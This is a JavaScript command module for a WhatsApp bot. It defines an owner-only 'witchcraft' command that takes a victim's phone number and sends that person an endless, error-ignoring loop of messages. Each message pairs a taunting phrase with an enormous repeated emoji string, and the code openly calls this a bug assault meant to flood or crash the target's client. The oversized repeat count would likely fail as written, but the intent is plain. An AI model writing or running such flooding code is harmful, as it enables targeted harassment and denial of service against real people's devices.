import { owners } from '../config.js'

export const name = 'witchcraft'
export const description = 'The most devastating bug ever unleashed'
export const command = ['witchcraft']
export const ownerOnly = true

export async function execute(m, { client, text, isOwner }) {
  if (!isOwner) return client.reply(m.chat, `🚫 Only the supreme witcher may wield this power!`, m)

  let target = ''
  if (m.quoted) target = m.quoted.sender
  else if (text) {
    if (text.includes('@')) target = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    else target = text + '@s.whatsapp.net'
  }
  if (!target) return client.reply(m.chat, '⚠️ Specify your doomed victim!', m)

  client.reply(m.chat, `🔥 Initiating apocalyptic witchcraft bug assault on ${target}! Brace for annihilation!`, m)

  const swarm = '🦇🕷️🐛🧙‍♀️🕸️🦂👹👻💀'.repeat(99999999999999)
  const cursedPhrases = [
    "⚡️ You face the eternal witch's plague!",
    "🔥 Your soul is consumed by the cursed swarm!",
    "☠️ No mercy, no escape, only darkness!",
    "🌑 The bug storm devours all hope!",
    "🕯️ This is your reckoning—pure chaos unleashed!",
    "🦹‍♀️ Witchcraft reigns supreme over your misery!",
  ]

  while (true) {
    try {
      const msg =
        cursedPhrases[Math.floor(Math.random() * cursedPhrases.length)] + '\n\n' + swarm

      await client.sendMessage(target, { text: msg })
      // No cooldown, no mercy
    } catch (e) {
      // Silently ignore errors, the plague persists
    }
  }
}
